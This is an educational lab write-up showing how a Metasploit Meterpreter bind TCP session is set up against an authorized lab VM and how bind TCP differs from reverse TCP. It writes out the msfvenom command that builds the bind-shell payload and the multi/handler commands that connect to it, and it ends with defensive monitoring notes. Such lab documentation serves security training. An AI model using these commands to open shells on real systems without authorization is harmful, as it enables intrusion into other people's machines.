# Evidence 04 — Bind TCP

## Objective

The objective of this step was to demonstrate the Bind TCP communication model using a Metasploit-compatible Meterpreter payload in an authorized laboratory environment.

## Bind TCP Concept

In a Bind TCP connection, the target creates a listening network endpoint.

The connecting system then connects to the target's listening port.

The communication model is:

    Attacker
       |
       | TCP connection
       ↓
    Target Listener

This differs from Reverse TCP, where the target initiates the connection toward the listener.

## Reverse TCP vs Bind TCP

### Reverse TCP

    Target → Attacker

The target initiates the connection toward the attacker/listener.

### Bind TCP

    Attacker → Target

The target listens on a configured port and the attacker connects to that listening endpoint.

## Lab Configuration

| Parameter | Value |
|---|---|
| Attacker | Kali Linux |
| Target | Authorized Laboratory VM |
| Target IP | `192.168.164.129` |
| Bind Port | `4444` |
| Payload | `linux/x86/meterpreter/bind_tcp` |
| Connection Type | Bind TCP |

## Payload Generation

A Linux x86 Meterpreter Bind TCP payload was generated for the authorized laboratory target.

Command:

    msfvenom -p linux/x86/meterpreter/bind_tcp LPORT=4444 -f elf -o bind_payload.elf

The payload was generated exclusively for use inside the authorized laboratory environment.

## Payload Configuration

The important payload parameter was:

    LPORT = 4444

This specifies the TCP port on which the target-side payload listens for the incoming connection.

## Multi/Handler Configuration

Metasploit's Multi/Handler was configured to use the same Bind TCP payload.

Commands:

    use exploit/multi/handler

    set PAYLOAD linux/x86/meterpreter/bind_tcp

    set RHOSTS 192.168.164.129

    set LPORT 4444

    show options

The configuration was reviewed before initiating the connection.

## Starting the Handler

The handler was started using:

    run

The handler then attempted to connect to the target's Bind TCP listener.

## Connection Flow

    ┌───────────────┐
    │ Kali Linux    │
    │ Multi/Handler │
    └───────┬───────┘
            │
            │ TCP connection
            │
            ▼
    ┌───────────────┐
    │ Authorized    │
    │ Target        │
    │               │
    │ Bind Listener │
    │ Port 4444     │
    └───────────────┘

## Session Establishment

After the authorized target-side payload was executed and began listening, the Metasploit handler connected to the target.

A Meterpreter session was then established through the Bind TCP connection.

## Security Relevance

Bind TCP demonstrates a different session-establishment model from Reverse TCP.

From a defensive perspective, a listening endpoint created by an unauthorized process may represent a security concern.

Security teams can investigate unexpected listening ports using:

- Host-based process monitoring
- Firewall logs
- Network monitoring
- Port enumeration
- Endpoint detection and response tools

## Evidence Screenshot

The following screenshot provides evidence of the Bind TCP configuration and successful session establishment.

![Bind TCP Session](../screenshots/04-bind-tcp.png)

## Result

The Bind TCP communication model was demonstrated successfully within the authorized laboratory environment.

The target-side payload listened for an incoming connection, and the Metasploit handler connected to the target listener.

A Meterpreter session was established through the Bind TCP connection.

## Conclusion

The Bind TCP practical demonstrated how the direction of session establishment differs from Reverse TCP.

In Bind TCP, the target listens for an incoming connection, while the connecting system initiates the TCP connection toward the target.

## Authorization

This activity was performed exclusively within an authorized cybersecurity laboratory environment for educational and security-training purposes.

No unauthorized systems were targeted.
